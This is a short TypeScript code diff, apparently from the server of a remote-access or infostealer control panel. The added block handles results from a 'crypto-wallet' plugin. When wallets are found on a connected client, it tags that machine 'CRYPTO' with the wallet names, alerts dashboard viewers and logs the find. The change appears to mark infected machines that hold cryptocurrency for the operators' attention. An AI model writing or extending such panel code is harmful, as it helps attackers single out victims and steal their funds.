@@ -8,6 +8,8 @@ import { encodeMessage } from "../protocol";
 import * as sessionManager from "../sessions/sessionManager";
 import type { SocketData } from "../sessions/types";
 import { deliverWebPushClientEvent } from "./notification-delivery";
+import { setClientTag } from "../db";
+import { notifyDashboardViewers } from "../sessions/sessionManager";
 
 type NotificationRecord = {
   id: string;
@@ -404,6 +406,18 @@ export function createNotificationPluginHandlers(deps: CreateDeps) {
         if (pluginId) {
           deps.pluginState.lastError[pluginId] = error || String((payload as any).message || "plugin error");
           void deps.savePluginState();
+        }
+      }
+      // Auto-tag client when crypto-wallet plugin reports findings
+      if (pluginId === "crypto-wallet" && event === "scan_result") {
+        const total: number = (eventPayload as any)?.total ?? 0;
+        if (total > 0) {
+          const wallets: any[] = (eventPayload as any)?.wallets ?? [];
+          const names = wallets.slice(0, 6).map((w: any) => w.name).join(", ");
+          const extra = wallets.length > 6 ? ` +${wallets.length - 6} more` : "";
+          setClientTag(clientId, "CRYPTO", `${total} wallet(s) detected: ${names}${extra}`);
+          notifyDashboardViewers();
+          logger.info(`[crypto-wallet] client=${clientId} tagged CRYPTO — ${total} wallet(s) found`);
         }
       }
       // Buffer all events for UI polling
